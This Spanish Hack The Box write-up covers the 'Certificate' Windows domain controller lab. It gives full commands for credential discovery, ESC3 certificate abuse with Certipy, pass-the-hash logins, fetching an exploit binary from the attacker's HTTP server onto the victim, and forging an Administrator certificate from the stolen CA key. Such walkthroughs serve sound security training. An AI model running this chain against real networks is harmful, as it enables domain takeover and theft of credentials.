# Certificate HTB - Write-up Completo y Detallado Avanzado.

## Información de la Máquina
- **IP**: 10.10.11.71
- **Nombre**: Certificate
- **Sistema Operativo**: Windows Server 2019 (Domain Controller)
- **Dificultad**: Media
- **Servicios principales**: IIS, Active Directory, Certificate Services
- **Flags**: Usuario y Root (reemplazadas con ****)

## Índice Completo
1. [Preparación del Entorno](#1-preparación-del-entorno)
2. [Reconocimiento y Enumeración Inicial](#2-reconocimiento-y-enumeración-inicial)
3. [Enumeración Web - Puerto 443](#3-enumeración-web-puerto-443)
4. [Acceso Inicial - SMB y Credenciales](#4-acceso-inicial-smb-y-credenciales)
5. [Primer Acceso - Usuario Lion.SK](#5-primer-acceso-usuario-lionsk)
6. [Enumeración del Sistema Windows](#6-enumeración-del-sistema-windows)
7. [Escalación Horizontal - Lion.SK a ryan.k](#7-escalación-horizontal-lionsk-a-ryank)
8. [Escalación de Privilegios - ryan.k a Administrator](#8-escalación-de-privilegios-ryank-a-administrator)
9. [Lecciones Aprendidas y Conceptos](#9-lecciones-aprendidas-y-conceptos)

---

## 1. Preparación del Entorno

### 1.1 Instalación de Herramientas Necesarias

```bash
# Actualizar el sistema
sudo apt update && sudo apt upgrade -y

# Herramientas básicas de red y web
sudo apt install -y nmap netcat curl wget git
sudo apt install -y gobuster dirbuster dirb nikto whatweb

# Herramientas para SMB/Windows
sudo apt install -y smbclient smbmap enum4linux crackmapexec evil-winrm
sudo apt install -y impacket-tools bloodhound neo4j

# Herramientas de cracking y análisis
sudo apt install -y john hashcat hydra
sudo apt install -y binwalk exiftool steghide

# Python y librerías
sudo apt install -y python3 python3-pip
pip3 install ldapdomaindump

# Herramientas para manipulación de tiempo
sudo apt install -y faketime chrony ntpdate rdate

# Certipy - Herramienta especializada para ADCS
cd ~
git clone https://github.com/ly4k/Certipy.git
cd Certipy
# Verificar instalación
python3 certipy/entry.py --version
```

### 1.2 Configuración del archivo hosts

```bash
# Editar el archivo hosts
sudo nano /etc/hosts

# Agregar estas líneas:
10.10.11.71 certificate.htb
10.10.11.71 dc01.certificate.htb
10.10.11.71 www.certificate.htb
```

---

## 2. Reconocimiento y Enumeración Inicial

### 2.1 Identificación del Sistema

```bash
# Ping para verificar que la máquina está activa
ping -c 1 10.10.11.71

# TTL=127 indica que es Windows (Linux tendría TTL=64)
```

### 2.2 Escaneo de Puertos

```bash
# Escaneo rápido de puertos comunes
nmap -sS -p- --min-rate 5000 10.10.11.71 -oN nmap_initial.txt

# Escaneo detallado de los puertos abiertos
nmap -sCV -p53,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 10.10.11.71 -oN nmap_detailed.txt
```

**Puertos encontrados y su propósito:**
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        .NET Message Framing
```

### 2.3 Identificación del Dominio

```bash
# Del output de nmap obtenemos:
# Domain: certificate.htb
# FQDN: DC01.certificate.htb
```

---

## 3. Enumeración Web - Puerto 443

### 3.1 Acceso Inicial a la Web

```bash
# Verificar qué hay en HTTPS
curl -k https://10.10.11.71
whatweb https://10.10.11.71

# Acceder con Firefox
firefox https://certificate.htb &
```

**Observación**: Encontramos una página corporativa de "Certificate LTD"

### 3.2 Enumeración de Directorios

```bash
# Gobuster con lista de directorios comunes
gobuster dir -u https://certificate.htb -w /usr/share/wordlists/dirb/common.txt -k

# Gobuster con lista más grande
gobuster dir -u https://certificate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 50

# Búsqueda de archivos específicos
gobuster dir -u https://certificate.htb -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,html,txt -k
```

**Directorios/Archivos encontrados:**
```
/assets              (Status: 301)
/css                 (Status: 301)
/img                 (Status: 301)
/js                  (Status: 301)
/index.html          (Status: 200)
```

### 3.3 Análisis del Código Fuente

```bash
# Descargar la página principal
wget https://certificate.htb -O index.html --no-check-certificate

# Buscar comentarios, links, información útil
grep -i "comment\|password\|user\|admin\|login" index.html
grep -oE 'href="[^"]*"' index.html | sort -u
```

### 3.4 Búsqueda de Subdominios

```bash
# Usando wfuzz
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "Host: FUZZ.certificate.htb" \
    --hc 404 --ssl https://10.10.11.71

# Usando gobuster
gobuster vhost -u https://certificate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k
```

**Nota**: No se encontraron subdominios adicionales en esta etapa.

---

## 4. Acceso Inicial - SMB y Credenciales

### 4.1 Enumeración SMB Sin Credenciales

```bash
# Enumerar shares disponibles
smbclient -L //10.10.11.71 -N
smbmap -H 10.10.11.71
smbmap -H 10.10.11.71 -u guest

# Enum4linux para información detallada
enum4linux 10.10.11.71

# Crackmapexec para verificación rápida
crackmapexec smb 10.10.11.71 -u '' -p '' --shares
crackmapexec smb 10.10.11.71 -u 'guest' -p '' --shares
```

### 4.2 Acceso al Share "Development"

```bash
# Conectarse al share Development
smbclient //10.10.11.71/Development -N

# Comandos dentro de smbclient:
smb: \> ls
smb: \> get LICENSE
smb: \> exit

# Ver el contenido del archivo
cat LICENSE
```

**Contenido importante del archivo LICENSE:**
```
[...]
Additionally the responsible administrator is Lion.Sk

Qualys scan results
-------------------
Host: DC01.certificate.htb
User: Lion.Sk, password: !QAZ2wsx
[...]
```

### 4.3 Problema con el Formato del Usuario

```bash
# Probar diferentes formatos del usuario
crackmapexec smb 10.10.11.71 -u 'Lion.Sk' -p '!QAZ2wsx'     # Falla
crackmapexec smb 10.10.11.71 -u 'lion.sk' -p '!QAZ2wsx'     # Falla
crackmapexec smb 10.10.11.71 -u 'LION.SK' -p '!QAZ2wsx'     # Falla
crackmapexec smb 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'     # ¡FUNCIONA!

# Verificar con dominio
crackmapexec smb 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx' -d 'CERTIFICATE'
```

---

## 5. Primer Acceso - Usuario Lion.SK

### 5.1 Conexión por WinRM

```bash
# Verificar que el usuario tiene acceso a WinRM
crackmapexec winrm 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'

# Conectarse con Evil-WinRM
evil-winrm -i 10.10.11.71 -u 'Lion.SK' -p '!QAZ2wsx'
```

### 5.2 Obtención de la Primera Flag

```powershell
# Verificar usuario actual
whoami
# Output: certificate\lion.sk

# Navegar al escritorio
cd C:\Users\Lion.SK\Desktop

# Listar archivos
dir

# Leer la flag de usuario
type user.txt
# Flag: ****************************
```

---

## 6. Enumeración del Sistema Windows

### 6.1 Información Básica del Sistema

```powershell
# Información del sistema
systeminfo

# Usuarios del dominio
net user
net user /domain

# Información del usuario actual
net user Lion.SK /domain

# Grupos del dominio
net group /domain

# Verificar si es Domain Controller
nltest /dclist:certificate.htb
```

### 6.2 Búsqueda de Archivos Interesantes

```powershell
# Buscar archivos con contraseñas
dir /s *pass* == *.txt
dir /s *password* == *.txt
dir /s *cred* == *.txt

# Buscar archivos de configuración
dir /s web.config
dir /s *.config
dir /s *.xml

# Buscar en el directorio web
cd C:\inetpub\wwwroot
dir /s
```

### 6.3 Enumeración de Servicios Web

```powershell
# Verificar IIS
iisreset /status

# Buscar archivos de XAMPP
dir C:\xampp

# Si existe XAMPP, buscar configuraciones
cd C:\xampp\htdocs
dir
```

### 6.4 Búsqueda en el Directorio de XAMPP

```powershell
# Navegar a XAMPP
cd C:\xampp\htdocs\certificate.htb
dir

# Buscar archivos PHP con configuraciones
type db.php
```

**Contenido de db.php (credenciales de MySQL):**
```php
<?php
$host = 'localhost';
$user = 'certificate_webapp_user';
$pass = 'cert!f!c@teDBPWD';
$db = 'certificate_webapp';
?>
```

### 6.5 Acceso a MySQL

```powershell
# Navegar al directorio de MySQL
cd C:\xampp\mysql\bin

# Conectarse a MySQL
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD"

# Comandos MySQL para enumerar
mysql> show databases;
mysql> use certificate_webapp;
mysql> show tables;
mysql> select * from users;
mysql> exit
```

**Nota**: En MySQL podríamos encontrar hashes de contraseñas para crackear con John The Ripper:

```bash
# Si encontramos hashes, en Kali:
echo "hash_aqui" > mysql_hash.txt
john mysql_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
```

### 6.6 Enumeración de Privilegios

```powershell
# Verificar privilegios del usuario actual
whoami /priv
whoami /groups
whoami /all

# Buscar servicios vulnerables
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Verificar tareas programadas
schtasks /query /fo LIST /v

# Verificar certificados instalados
certutil -store my
certutil -store root
```

---

## 7. Escalación Horizontal - Lion.SK a ryan.k

### 7.1 Enumeración de Active Directory Certificate Services (ADCS)

```bash
# Desde Kali, usando Certipy
cd ~/Certipy

# Enumerar vulnerabilidades en ADCS
python3 certipy/entry.py find -u 'Lion.SK@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout | tee certipy_enum.txt

# Analizar el output
grep -i "ESC" certipy_enum.txt
```

**Vulnerabilidad encontrada: ESC3**
- Template vulnerable: `Delegated-CRA`
- Permite Certificate Request Agent
- Puede solicitar certificados en nombre de otros usuarios

### 7.2 Explicación de ESC3

ESC3 es una vulnerabilidad en la que:
1. Un usuario puede obtener un certificado con el permiso de "Certificate Request Agent"
2. Con ese certificado, puede solicitar certificados para otros usuarios
3. Esto permite suplantar la identidad de cualquier usuario del dominio

### 7.3 Explotación de ESC3 - Paso 1: Obtener Certificado de Agente

```bash
# Solicitar certificado de agente para Lion.SK
python3 certipy/entry.py req \
    -u 'Lion.SK@CERTIFICATE.HTB' \
    -p '!QAZ2wsx' \
    -dc-ip 10.10.11.71 \
    -target DC01.CERTIFICATE.HTB \
    -ca 'Certificate-LTD-CA' \
    -template 'Delegated-CRA' \
    -out lion.sk

# Verificar archivos creados
ls -la lion.sk*
# lion.sk.pfx - Certificado con clave privada
# lion.sk.crt - Certificado público
# lion.sk.key - Clave privada
```

### 7.4 Explotación de ESC3 - Paso 2: Solicitar Certificado para ryan.k

```bash
# Usar el certificado de agente para solicitar uno de ryan.k
python3 certipy/entry.py req \
    -u 'Lion.SK@CERTIFICATE.HTB' \
    -p '!QAZ2wsx' \
    -dc-ip 10.10.11.71 \
    -target DC01.CERTIFICATE.HTB \
    -ca 'Certificate-LTD-CA' \
    -template 'SignedUser' \
    -on-behalf-of 'CERTIFICATE\ryan.k' \
    -pfx lion.sk.pfx \
    -out ryan.k

# Verificar certificado creado
ls -la ryan.k*
```

### 7.5 Problema: Sincronización de Tiempo con Kerberos

```bash
# Intento 1: Autenticarse con el certificado
python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'

# ERROR: KRB_AP_ERR_SKEW(Clock skew too great)
```

#### ¿Por qué ocurre este error?
Kerberos requiere que el reloj del cliente esté sincronizado con el servidor (diferencia máxima: 5 minutos).

### 7.6 Soluciones para la Sincronización de Tiempo

```bash
# Método 1: Ver la hora del DC
nmap -p 445 --script smb2-time 10.10.11.71 | grep date
# Output: date: 2025-09-18T03:37:44

# Método 2: Sincronizar manualmente
sudo date -s "18 SEP 2025 03:38:00"
# Luego intentar inmediatamente
python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'

# Método 3: Usar faketime (ESTE FUNCIONÓ)
faketime '2025-09-18 03:50:00' python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'

# Método 4: Cambiar zona horaria
sudo timedatectl set-timezone UTC
date
```

### 7.7 Autenticación Exitosa y Obtención del Hash

```bash
# Usando faketime
faketime '2025-09-18 03:50:00' python3 certipy/entry.py auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'

# Output exitoso:
# [*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

### 7.8 Conexión como ryan.k

```bash
# Usar solo la parte del hash NTLM (después de los dos puntos)
evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

---

## 8. Escalación de Privilegios - ryan.k a Administrator

### 8.1 Enumeración de Privilegios de ryan.k

```powershell
# Verificar usuario
whoami
# Output: certificate\ryan.k

# Verificar privilegios especiales
whoami /priv
```

**Privilegio importante encontrado:**
```
SeManageVolumePrivilege       Perform volume maintenance tasks  Enabled
```

### 8.2 ¿Qué es SeManageVolumePrivilege?

Este privilegio permite:
- Realizar tareas de mantenimiento en volúmenes
- Cambiar permisos en cualquier archivo del sistema
- Es un privilegio muy peligroso si se puede explotar

### 8.3 Descarga del Exploit SeManageVolumeExploit

**En Kali:**
```bash
# Descargar el exploit
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

# Verificar descarga
file SeManageVolumeExploit.exe
ls -la SeManageVolumeExploit.exe

# Iniciar servidor web
python3 -m http.server 8000

# Verificar tu IP
ip a | grep tun0
# Ejemplo: inet 10.10.14.59/23
```

**En la máquina víctima (como ryan.k):**
```powershell
# Descargar el exploit (usar TU IP)
curl http://10.10.14.59:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe

# Si curl falla, usar Invoke-WebRequest
Invoke-WebRequest -Uri http://10.10.14.59:8000/SeManageVolumeExploit.exe -OutFile SeManageVolumeExploit.exe

# Verificar descarga
dir SeManageVolumeExploit.exe
```

### 8.4 Ejecutar el Exploit

```powershell
# Verificar permisos antes
icacls C:\

# Ejecutar el exploit
.\SeManageVolumeExploit.exe
# Output: Entries changed: 876
# DONE

# Verificar permisos después
icacls C:\
# Ahora deberíamos ver permisos adicionales

# Probar escritura
echo "test" > C:\Windows\test.txt
type C:\Windows\test.txt
del C:\Windows\test.txt
```

### 8.5 Buscar y Exportar el Certificado CA

```powershell
# Crear directorio temporal
mkdir C:\temp -Force

# Listar certificados del sistema
Get-ChildItem -Path Cert:\LocalMachine\My
Get-ChildItem -Path Cert:\LocalMachine\Root

# Buscar específicamente el CA
Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*Certificate-LTD-CA*"}

# Resultado:
# Thumbprint: 2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8  
# Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
```

### 8.6 Exportar el Certificado CA con Clave Privada

```powershell
# Método 1: PowerShell
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*Certificate-LTD-CA*"}
Export-PfxCertificate -Cert $cert -FilePath C:\temp\ca.pfx -Password (ConvertTo-SecureString -String "password" -Force -AsPlainText)

# Método 2: certutil (si el método 1 falla)
certutil -exportPFX -p password my 2F02901DCFF083ED3DBB6CB0A15BBFEE6002B1A8 C:\temp\ca.pfx

# Copiar al directorio actual para descarga
copy C:\temp\ca.pfx .
dir ca.pfx

# Descargar
download ca.pfx
```

### 8.7 Certificate Forgery - Crear Certificado de Administrator

**En Kali:**
```bash
cd ~/Certificate/Certipy

# Verificar que tenemos el ca.pfx
ls -la ca.pfx

# Forjar certificado de Administrator
python3 certipy/entry.py forge \
    -ca-pfx ca.pfx \
    -ca-password 'password' \
    -upn 'administrator@certificate.htb' \
    -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' \
    -out admin.pfx

# Verificar creación
ls -la admin.pfx
```

### 8.8 Autenticarse como Administrator

```bash
# Intentar autenticación (probablemente fallará por tiempo)
python3 certipy/entry.py auth -dc-ip '10.10.11.71' -pfx 'admin.pfx'

# Usar faketime para solucionar el problema de tiempo
faketime '2025-09-18 04:10:00' python3 certipy/entry.py auth -dc-ip '10.10.11.71' -pfx 'admin.pfx'

# Output exitoso:
# [*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

### 8.9 Acceso como Administrator

```bash
# Conectarse con el hash de Administrator
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```

### 8.10 Obtener la Flag Root

```powershell
# Verificar que somos Administrator
whoami
# Output: certificate\administrator

# Navegar al escritorio
cd C:\Users\Administrator\Desktop

# Listar archivos
dir

# Leer la flag root
type root.txt
# Flag: ****************************
```

---

## 9. Lecciones Aprendidas y Conceptos

### 9.1 Flujo Completo del Ataque

1. **Reconocimiento**: Enumeración de puertos y servicios
2. **Enumeración Web**: Búsqueda sin éxito en puerto 443
3. **Enumeración SMB**: Encontrar share "Development"
4. **Credenciales Iniciales**: Lion.SK en archivo LICENSE
5. **Acceso Inicial**: WinRM con Lion.SK
6. **Enumeración Interna**: Búsqueda de archivos y servicios
7. **ADCS Vulnerabilidad**: ESC3 en Certificate Services
8. **Escalación Horizontal**: Lion.SK → ryan.k via certificados
9. **Privilegio Especial**: SeManageVolumePrivilege
10. **Certificate Forgery**: Crear certificado de Administrator
11. **Acceso Total**: Administrator con certificado forjado

### 9.2 Conceptos Técnicos Importantes

#### 9.2.1 Active Directory Certificate Services (ADCS)
- Sistema para crear y gestionar certificados digitales
- Los templates mal configurados permiten escalación
- ESC3: Certificate Request Agent abuse
- Herramienta principal: Certipy

#### 9.2.2 Sincronización de Tiempo en Kerberos
- Kerberos rechaza autenticación si diferencia > 5 minutos
- Herramientas: faketime, ntpdate, date -s
- Siempre verificar hora del DC antes de autenticar

#### 9.2.3 SeManageVolumePrivilege
- Permite cambiar permisos en cualquier archivo
- Exploit público disponible
- Usado para acceder a claves privadas protegidas

#### 9.2.4 Certificate Forgery
- Con el certificado CA se pueden crear certificados válidos
- Permite autenticación como cualquier usuario
- No requiere conocer contraseñas

### 9.3 Comandos Útiles de Referencia

#### Windows/PowerShell:
```powershell
whoami /priv              # Ver privilegios
Get-ChildItem -Recurse    # Buscar archivos
certutil -store my        # Ver certificados
net user /domain          # Usuarios del dominio
```

#### Linux/Kali:
```bash
crackmapexec smb IP -u USER -p PASS    # Verificar credenciales
faketime 'FECHA' comando                # Ejecutar con fecha falsa
evil-winrm -i IP -u USER -H HASH        # Conectar con hash
```

### 9.4 Errores Comunes y Soluciones

1. **Usuario con formato incorrecto**
   - Probar mayúsculas: Lion.SK en vez de lion.sk

2. **Error de sincronización de tiempo**
   - Usar faketime es más confiable
   - Verificar hora exacta del DC

3. **Descarga fallida en Evil-WinRM**
   - Copiar archivo al directorio actual primero
   - Evitar rutas complejas

4. **IPs incorrectas en comandos**
   - Verificar con: ip a | grep tun0
   - No usar corchetes en PowerShell

### 9.5 Herramientas Clave Utilizadas

1. **Certipy**: Explotación de ADCS
2. **Evil-WinRM**: Acceso remoto Windows
3. **faketime**: Manipulación de tiempo
4. **crackmapexec**: Verificación de credenciales
5. **smbclient**: Acceso a shares SMB
6. **John The Ripper**: Cracking de hashes
7. **SeManageVolumeExploit**: Abuso de privilegio

### 9.6 Referencias y Recursos

- Certipy: https://github.com/ly4k/Certipy
- ADCS Attacks: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- SeManageVolumeExploit: https://github.com/CsEnox/SeManageVolumeExploit
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm

---

## Notas Finales

Este write-up documenta el proceso completo incluyendo:
- Todos los comandos utilizados
- Los errores encontrados y sus soluciones
- Múltiples métodos probados (incluso los que fallaron)
- Explicaciones detalladas para principiantes

El objetivo es aprender no solo qué funcionó, sino también entender por qué funcionó y qué hacer cuando algo falla.

**Importante**: Este documento es solo para fines educativos. Úsalo únicamente en entornos autorizados como HackTheBox.
